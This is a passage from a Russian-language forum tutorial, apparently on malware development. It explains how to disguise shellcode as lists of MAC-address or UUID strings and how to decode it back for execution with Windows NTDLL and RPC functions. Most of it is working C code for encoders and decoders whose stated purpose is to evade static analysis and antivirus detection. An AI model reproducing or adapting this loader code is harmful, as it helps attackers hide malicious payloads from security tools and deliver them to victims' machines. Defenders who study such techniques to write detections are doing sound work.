–†–µ–∞–ª–∏–∑–∞—Ü–∏—è MACFuscation –±—É–¥–µ—Ç –∞–Ω–∞–ª–æ–≥–∏—á–Ω–∞ —Ç–æ–º—É, —á—Ç–æ –±—ã–ª–æ —Å–¥–µ–ª–∞–Ω–æ –≤ –ø—Ä–µ–¥—ã–¥—É—â–µ–º –º–æ–¥—É–ª–µ —Å IPv4/IPv6fuscation. MAC-–∞–¥—Ä–µ—Å —Å–æ—Å—Ç–æ–∏—Ç –∏–∑ 6 –±–∞–π—Ç–æ–≤, –ø–æ—ç—Ç–æ–º—É shellcode –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –∫—Ä–∞—Ç–Ω—ã–º 6, –∫–æ—Ç–æ—Ä—ã–π, –∫–∞–∫ –∏ —Ä–∞–Ω–µ–µ, –º–æ–∂–µ—Ç –±—ã—Ç—å –¥–æ–ø–æ–ª–Ω–µ–Ω, –µ—Å–ª–∏ –æ–Ω –Ω–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç —ç—Ç–æ–º—É —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—é.<br />
<br />
–ü—Ä–∏–Ω—Ü–∏–ø —Ä–∞–±–æ—Ç—ã –æ—á–µ–Ω—å –ø—Ä–æ—Å—Ç: –∫–∞–∂–¥—ã–µ 6 –±–∞–π—Ç–æ–≤ shellcode –ø—Ä–µ–æ–±—Ä–∞–∑—É—é—Ç—Å—è –≤ –æ–¥–∏–Ω MAC-–∞–¥—Ä–µ—Å. –≠—Ç–æ—Ç –ø–æ–¥—Ö–æ–¥ –ø–æ–∑–≤–æ–ª—è–µ—Ç —Å–æ–∑–¥–∞—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π —É—Ä–æ–≤–µ–Ω—å –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏, —Ç–∞–∫ –∫–∞–∫ MAC-–∞–¥—Ä–µ—Å–∞ —è–≤–ª—è—é—Ç—Å—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–º–∏ –∏ –Ω–µ –≤—ã–∑–æ–≤—É—Ç –ø–æ–¥–æ–∑—Ä–µ–Ω–∏–π –ø—Ä–∏ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–æ–º –∞–Ω–∞–ª–∏–∑–µ.<br />
<br />
–í–∞–∂–Ω–æ –ø–æ–º–Ω–∏—Ç—å, —á—Ç–æ, –∫–∞–∫ –∏ —Å –¥—Ä—É–≥–∏–º–∏ –º–µ—Ç–æ–¥–∞–º–∏ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏, MACFuscation –Ω–µ –¥–æ–±–∞–≤–ª—è–µ—Ç –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–≥–æ —É—Ä–æ–≤–Ω—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏–ª–∏ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∫ shellcode, –∞ –ø—Ä–æ—Å—Ç–æ –º–µ–Ω—è–µ—Ç –µ–≥–æ –≤–Ω–µ—à–Ω–∏–π –≤–∏–¥. –≠—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –∑–∞—Ç—Ä—É–¥–Ω–∏—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –∞–Ω–∞–ª–∏–∑ shellcode.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Function takes in 6 raw bytes and returns them in a MAC address string format
char* GenerateMAC(int a, int b, int c, int d, int e, int f) {
    char Output[64];

    // Creating the MAC address and saving it to the &#039;Output&#039; variable
    sprintf(Output, &quot;%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X&quot;,a, b, c, d, e, f);

    // Optional: Print the &#039;Output&#039; variable to the console
    // printf(&quot;[i] Output: %s\n&quot;, Output);

    return (char*)Output;
}

// Generate the MAC output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer &amp; the size of the shellcode buffer
BOOL GenerateMacOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {

    // If the shellcode buffer is null or the size is not a multiple of 6, exit
    if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 6 != 0){
        return FALSE;
    }
    printf(&quot;char* MacArray [%d] = {\n\t&quot;, (int)(ShellcodeSize / 6));

    // We will read one shellcode byte at a time, when the total is 6, begin generating the MAC address
    // The variable &#039;c&#039; is used to store the number of bytes read. By default, starts at 6.
    int c = 6, counter = 0;
    char* Mac = NULL;

    for (int i = 0; i &lt; ShellcodeSize; i++) {

        // Track the number of bytes read and when they reach 6 we enter this if statement to begin generating the MAC address
        if (c == 6) {
            counter++;

            // Generating the MAC address from 6 bytes which begin at i until [i + 5]
            Mac = GenerateMAC(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3], pShellcode[i + 4], pShellcode[i + 5]);

            if (i == ShellcodeSize - 6) {

                // Printing the last MAC address
                printf(&quot;\&quot;%s\&quot;&quot;, Mac);
                break;
            }
            else {
                // Printing the MAC address
                printf(&quot;\&quot;%s\&quot;, &quot;, Mac);
            }
            c = 1;

            // Optional: To beautify the output on the console
            if (counter % 6 == 0) {
                printf(&quot;\n\t&quot;);
            }
        }
        else {
            c++;
        }
    }
    printf(&quot;\n};\n\n&quot;);
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–î–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏—è Payloads MACFuscation</b><br />
<br />
–ü—Ä–æ—Ü–µ—Å—Å –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –±—É–¥–µ—Ç –æ–±—Ä–∞—Ç–Ω—ã–º –ø—Ä–æ—Ü–µ—Å—Å—É –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏, –ø–æ–∑–≤–æ–ª—è—è –≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å –±–∞–π—Ç—ã –∏–∑ MAC-–∞–¥—Ä–µ—Å–∞ –≤–º–µ—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –±–∞–π—Ç–æ–≤ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è MAC-–∞–¥—Ä–µ—Å–∞. –î–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ NTDLL API - RtlEthernetStringToAddressA. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–µ–æ–±—Ä–∞–∑—É–µ—Ç MAC-–∞–¥—Ä–µ—Å –∏–∑ —Å—Ç—Ä–æ–∫–æ–≤–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è –≤ –µ–≥–æ –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç.<br />
<br />
–î–ª—è –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ payload, –∫–æ—Ç–æ—Ä—ã–π –±—ã–ª –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º MACFuscation, –≤—ã –¥–æ–ª–∂–Ω—ã –±—É–¥–µ—Ç–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å–ª–µ–¥—É—é—â–∏–µ —à–∞–≥–∏:<br />
<ol>
<li data-xf-list-type="ol">–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è: –ü–æ–ª—É—á–∏—Ç–µ –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏ RtlEthernetStringToAddressA —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º GetProcAddress –∏ GetModuleHandle.</li>
<li data-xf-list-type="ol">–í—ã–¥–µ–ª–∏—Ç–µ –±—É—Ñ–µ—Ä –¥–ª—è –¥–µ–æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ payload. –ü–æ—Å–∫–æ–ª—å–∫—É –∫–∞–∂–¥—ã–π MAC-–∞–¥—Ä–µ—Å –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç 6 –±–∞–π—Ç–æ–≤, —Ä–∞–∑–º–µ—Ä –±—É—Ñ–µ—Ä–∞ –±—É–¥–µ—Ç –∫—Ä–∞—Ç–µ–Ω 6.</li>
<li data-xf-list-type="ol">–ò—Ç–µ—Ä–∞—Ü–∏—è: –ü—Ä–æ–π–¥–∏—Ç–µ —á–µ—Ä–µ–∑ –∫–∞–∂–¥—ã–π MAC-–∞–¥—Ä–µ—Å –≤ –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω–æ–º payload.</li>
<li data-xf-list-type="ol">–ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è: –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ RtlEthernetStringToAddressA –¥–ª—è –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è –∫–∞–∂–¥–æ–≥–æ MAC-–∞–¥—Ä–µ—Å–∞ –∏–∑ —Å—Ç—Ä–æ–∫–æ–≤–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è –≤ –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç.</li>
<li data-xf-list-type="ol">–°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ: –î–æ–±–∞–≤—å—Ç–µ –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–Ω—ã–µ –±–∞–π—Ç—ã –≤ –±—É—Ñ–µ—Ä –¥–µ–æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ payload.</li>
</ol>–ü–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —ç—Ç–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ —É –≤–∞—Å –±—É–¥–µ—Ç –¥–µ–æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–π payload, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–Ω–æ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª–Ω–∏—Ç—å.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef NTSTATUS (NTAPI* fnRtlEthernetStringToAddressA)(
    PCSTR        S,
    PCSTR*         Terminator,
    PVOID        Addr
);

BOOL MacDeobfuscation(IN CHAR* MacArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE          pBuffer        = NULL,
                   TmpBuffer      = NULL;

    SIZE_T         sBuffSize      = NULL;

    PCSTR          Terminator     = NULL;

    NTSTATUS       STATUS         = NULL;

    // Getting RtlIpv6StringToAddressA address from ntdll.dll
    fnRtlEthernetStringToAddressA pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandle(TEXT(&quot;NTDLL&quot;)), &quot;RtlEthernetStringToAddressA&quot;);
    if (pRtlEthernetStringToAddressA == NULL) {
        printf(&quot;[!] GetProcAddress Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Getting the real size of the shellcode which is the number of MAC addresses * 6
    sBuffSize = NmbrOfElements * 6;


    // Allocating memeory which will hold the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL) {
        printf(&quot;[!] HeapAlloc Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    TmpBuffer = pBuffer;

    // Loop through all the MAC addresses saved in MacArray
    for (int i = 0; i &lt; NmbrOfElements; i++) {

        // Deobfuscating one MAC address at a time
        // MacArray[i] is a single Mac address from the array MacArray
        if ((STATUS = pRtlEthernetStringToAddressA(MacArray[i], &amp;Terminator, TmpBuffer)) != 0x0) {
            // if it failed
            printf(&quot;[!] RtlEthernetStringToAddressA Failed At [%s] With Error 0x%0.8X&quot;, MacArray[i], STATUS);
            return FALSE;
        }

        // 6 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 6 to store the
        TmpBuffer = (PBYTE)(TmpBuffer + 6);

    }

    // Save the base address &amp; size of the deobfuscated payload
    *ppDAddress  = pBuffer;
    *pDSize      = sBuffSize;

    return TRUE;

}</code></pre>
	</div>
</div><br />
–ü—Ä–∏–º–µ—Ä –∑–∞–ø—É—Å–∫–∞ –∫–æ–¥–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773939975.png"
		data-src="https://osint42.org/attachments/1746773939975-png.83/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773939975-png.83/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773939975.png"
			title="1746773939975.png"
			width="1376" height="859" loading="lazy" />
	</div><br />
<br />
<b>3)UUID-–û–±—Ñ—É—Å–∫–∞—Ü–∏—è</b><br />
–†–∞—Å—Å–º–æ—Ç—Ä–∏–º –µ—â–µ –æ–¥–Ω—É —Ç–µ—Ö–Ω–∏–∫—É –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏, –∫–æ—Ç–æ—Ä–∞—è –ø—Ä–µ–æ–±—Ä–∞–∑—É–µ—Ç shellcode –≤ —Å—Ç—Ä–æ–∫—É –£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω–æ–≥–æ –£–Ω–∏–∫–∞–ª—å–Ω–æ–≥–æ –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–∞ (UUID).<br />
UUID –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π 36-—Å–∏–º–≤–æ–ª—å–Ω—É—é –±—É–∫–≤–µ–Ω–Ω–æ-—Ü–∏—Ñ—Ä–æ–≤—É—é —Å—Ç—Ä–æ–∫—É, –∫–æ—Ç–æ—Ä—É—é –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏.<br />
<br />
<b>–°—Ç—Ä—É–∫—Ç—É—Ä–∞ UUID</b><br />
<br />
–§–æ—Ä–º–∞—Ç UUID —Å–æ—Å—Ç–æ–∏—Ç –∏–∑ 5 —Å–µ–≥–º–µ–Ω—Ç–æ–≤ —Ä–∞–∑–Ω–æ–≥–æ —Ä–∞–∑–º–µ—Ä–∞, –∫–æ—Ç–æ—Ä—ã–µ –≤—ã–≥–ª—è–¥—è—Ç –ø—Ä–∏–º–µ—Ä–Ω–æ —Ç–∞–∫: 801B18F0-8320-4ADA-BB13-41EA1C886B87. –ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –Ω–∏–∂–µ –∏–ª–ª—é—Å—Ç—Ä–∏—Ä—É–µ—Ç —Å—Ç—Ä—É–∫—Ç—É—Ä—É UUID.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773949798.png"
		data-src="https://osint42.org/attachments/1746773949798-png.84/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773949798-png.84/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773949798.png"
			title="1746773949798.png"
			width="791" height="419" loading="lazy" />
	</div><br />
<br />
–ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ UUID –≤ shellcode —è–≤–ª—è–µ—Ç—Å—è –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–µ–Ω–µ–µ –æ—á–µ–≤–∏–¥–Ω—ã–º, —á–µ–º –ø—Ä–µ–¥—ã–¥—É—â–∏–µ –º–µ—Ç–æ–¥—ã –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏. –ù–∞–ø—Ä–∏–º–µ—Ä, FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51 –Ω–µ –ø—Ä–µ–æ–±—Ä–∞–∑—É–µ—Ç—Å—è –≤ FC4883E4-F0E8-C000-0000-415141505251, –≤–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ –ø–æ–ª—É—á–∞–µ—Ç—Å—è E48348FC-E8F0-00C0-0000-415141505251.<br />
<br />
–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ –ø–µ—Ä–≤—ã–µ 3 —Å–µ–≥–º–µ–Ω—Ç–∞ –∏—Å–ø–æ–ª—å–∑—É—é—Ç —Ç–µ –∂–µ –±–∞–π—Ç—ã –≤ –Ω–∞—à–µ–º shellcode, –Ω–æ –ø–æ—Ä—è–¥–æ–∫ –æ–±—Ä–∞—Ç–Ω—ã–π. –ü—Ä–∏—á–∏–Ω–∞ –≤ —Ç–æ–º, —á—Ç–æ –ø–µ—Ä–≤—ã–µ —Ç—Ä–∏ —Å–µ–≥–º–µ–Ω—Ç–∞ –∏—Å–ø–æ–ª—å–∑—É—é—Ç –ø–æ—Ä—è–¥–æ–∫ –±–∞–π—Ç–æ–≤ little-endian. –î–ª—è –ø–æ–ª–Ω–æ–≥–æ –ø–æ–Ω–∏–º–∞–Ω–∏—è –¥–∞–≤–∞–π—Ç–µ —Ä–∞–∑–±–µ—Ä–µ–º—Å—è —Å –∫–∞–∂–¥—ã–º —Å–µ–≥–º–µ–Ω—Ç–æ–º.<br />
<br />
Little Endian: –°–µ–≥–º–µ–Ω—Ç 1: FC 48 83 E4 —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è E4 83 48 FC –≤ —Å—Ç—Ä–æ–∫–µ UUID –°–µ–≥–º–µ–Ω—Ç 2: E8 F0 —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è F0 E8 –≤ —Å—Ç—Ä–æ–∫–µ UUID –°–µ–≥–º–µ–Ω—Ç 3: C0 00 —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è 00 C0 –≤ —Å—Ç—Ä–æ–∫–µ UUID<br />
<br />
Big Endian: –°–µ–≥–º–µ–Ω—Ç 4: 00 00 –æ—Å—Ç–∞–µ—Ç—Å—è 00 00 –≤ —Å—Ç—Ä–æ–∫–µ UUID –°–µ–≥–º–µ–Ω—Ç 5: 41 51 41 50 52 51 –æ—Å—Ç–∞–µ—Ç—Å—è 41 51 41 50 52 51 –≤ —Å—Ç—Ä–æ–∫–µ UUID<br />
<br />
–†–µ–∞–ª–∏–∑–∞—Ü–∏—è UUIDFuscation: –ê–¥—Ä–µ—Å UUID —Å–æ—Å—Ç–æ–∏—Ç –∏–∑ 16 –±–∞–π—Ç–æ–≤, –ø–æ—ç—Ç–æ–º—É shellcode –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –∫—Ä–∞—Ç–µ–Ω 16. UUIDFuscation –±—É–¥–µ—Ç –≤–æ –º–Ω–æ–≥–æ–º –Ω–∞–ø–æ–º–∏–Ω–∞—Ç—å IPv6Fuscation –∏–∑-–∑–∞ —Ç–æ–≥–æ, —á—Ç–æ –æ–±–∞ –º–µ—Ç–æ–¥–∞ —Ç—Ä–µ–±—É—é—Ç –∫—Ä–∞—Ç–Ω–æ—Å—Ç–∏ shellcode 16 –±–∞–π—Ç–∞–º. –û–ø—è—Ç—å –∂–µ, –º–æ–∂–Ω–æ –¥–æ–ø–æ–ª–Ω–∏—Ç—å –±—É—Ñ–µ—Ä, –µ—Å–ª–∏ shellcode –Ω–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç —ç—Ç–æ–º—É —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—é.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Function takes in 16 raw bytes and returns them in a UUID string format
char* GenerateUUid(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {

    // Each UUID segment is 32 bytes
    char Output0[32], Output1[32], Output2[32], Output3[32];

    // There are 4 segments in a UUID (32 * 4 = 128)
    char result[128];

    // Generating output0 from the first 4 bytes
    sprintf(Output0, &quot;%0.2X%0.2X%0.2X%0.2X&quot;, d, c, b, a);

    // Generating output1 from the second 4 bytes
    sprintf(Output1, &quot;%0.2X%0.2X-%0.2X%0.2X&quot;, f, e, h, g);

    // Generating output2 from the third 4 bytes
    sprintf(Output2, &quot;%0.2X%0.2X-%0.2X%0.2X&quot;, i, j, k, l);

    // Generating output3 from the last 4 bytes
    sprintf(Output3, &quot;%0.2X%0.2X%0.2X%0.2X&quot;, m, n, o, p);

    // Combining Output0,1,2,3 to generate the UUID
    sprintf(result, &quot;%s-%s-%s%s&quot;, Output0, Output1, Output2, Output3);

    //printf(&quot;[i] result: %s\n&quot;, (char*)result);
    return (char*)result;
}

// Generate the UUID output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer &amp; the size of the shellcode buffer
BOOL GenerateUuidOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
    // If the shellcode buffer is null or the size is not a multiple of 16, exit
    if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 16 != 0) {
        return FALSE;
    }
    printf(&quot;char* UuidArray[%d] = { \n\t&quot;, (int)(ShellcodeSize / 16));

    // We will read one shellcode byte at a time, when the total is 16, begin generating the UUID string
    // The variable &#039;c&#039; is used to store the number of bytes read. By default, starts at 16.
    int c = 16, counter = 0;
    char* UUID = NULL;

    for (int i = 0; i &lt; ShellcodeSize; i++) {
        // Track the number of bytes read and when they reach 16 we enter this if statement to begin generating the UUID string
        if (c == 16) {
            counter++;

            // Generating the UUID string from 16 bytes which begin at i until [i + 15]
            UUID = GenerateUUid(
                pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3],
                pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7],
                pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11],
                pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15]
            );
            if (i == ShellcodeSize - 16) {

                // Printing the last UUID string
                printf(&quot;\&quot;%s\&quot;&quot;, UUID);
                break;
            }
            else {
                // Printing the UUID string
                printf(&quot;\&quot;%s\&quot;, &quot;, UUID);
            }
            c = 1;
            // Optional: To beautify the output on the console
            if (counter % 3 == 0) {
                printf(&quot;\n\t&quot;);
            }
        }
        else {
            c++;
        }
    }
    printf(&quot;\n};\n\n&quot;);
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ UUID</b><br />
<br />
–•–æ—Ç—è —Ä–∞–∑–Ω—ã–µ —Å–µ–≥–º–µ–Ω—Ç—ã –∏–º–µ—é—Ç —Ä–∞–∑–Ω—ã–π –ø–æ—Ä—è–¥–æ–∫ –±–∞–π—Ç–æ–≤ (endianness), —ç—Ç–æ –Ω–µ –ø–æ–≤–ª–∏—è–µ—Ç –Ω–∞ –ø—Ä–æ—Ü–µ—Å—Å –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏, –ø–æ—Ç–æ–º—É —á—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è WinAPI UuidFromStringA —É—á–∏—Ç—ã–≤–∞–µ—Ç —ç—Ç–æ.<br />
<br />
–¢–æ –µ—Å—Ç—å –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ —Ñ—É–Ω–∫—Ü–∏–∏ UuidFromStringA –¥–ª—è –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫–æ–≤–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è UUID –æ–±—Ä–∞—Ç–Ω–æ –≤ –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç, –ø–æ—Ä—è–¥–æ–∫ –±–∞–π—Ç–æ–≤ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —É—á–∏—Ç—ã–≤–∞–µ—Ç—Å—è –≤–Ω—É—Ç—Ä–∏ —Ñ—É–Ω–∫—Ü–∏–∏, –∏ –≤—ã –ø–æ–ª—É—á–∞–µ—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–µ –±–∏–Ω–∞—Ä–Ω–æ–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ –±–µ–∑ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ —è–≤–Ω–æ –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤—ã–≤–∞—Ç—å –ø–æ—Ä—è–¥–æ–∫ –±–∞–π—Ç–æ–≤ –¥–ª—è —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Å–µ–≥–º–µ–Ω—Ç–æ–≤ UUID.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef RPC_STATUS (WINAPI* fnUuidFromStringA)(
    RPC_CSTR    StringUuid,
    UUID*        Uuid
);

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

        PBYTE          pBuffer         = NULL,
                       TmpBuffer       = NULL;

        SIZE_T         sBuffSize       = NULL;

        RPC_STATUS     STATUS          = NULL;

    // Getting UuidFromStringA address from Rpcrt4.dll
    fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT(&quot;RPCRT4&quot;)), &quot;UuidFromStringA&quot;);
    if (pUuidFromStringA == NULL) {
        printf(&quot;[!] GetProcAddress Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Getting the real size of the shellcode which is the number of UUID strings * 16
    sBuffSize = NmbrOfElements * 16;

    // Allocating memory which will hold the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
    if (pBuffer == NULL) {
        printf(&quot;[!] HeapAlloc Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Setting TmpBuffer to be equal to pBuffer
    TmpBuffer = pBuffer;

    // Loop through all the UUID strings saved in UuidArray
    for (int i = 0; i &lt; NmbrOfElements; i++) {

        // Deobfuscating one UUID string at a time
        // UuidArray[i] is a single UUID string from the array UuidArray
        if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
            // if it failed
            printf(&quot;[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X&quot;, UuidArray[i], STATUS);
            return FALSE;
        }

        // 16 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
        TmpBuffer = (PBYTE)(TmpBuffer + 16);

    }

    *ppDAddress = pBuffer;
    *pDSize     = sBuffSize;

    return TRUE;
}</code></pre>
	</div>
</div><br />
–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è –∑–∞–ø—É—Å–∫–∞ –∫–æ–¥–∞:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746773964608.png"
		data-src="https://osint42.org/attachments/1746773964608-png.85/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746773964608-png.85/index.html"
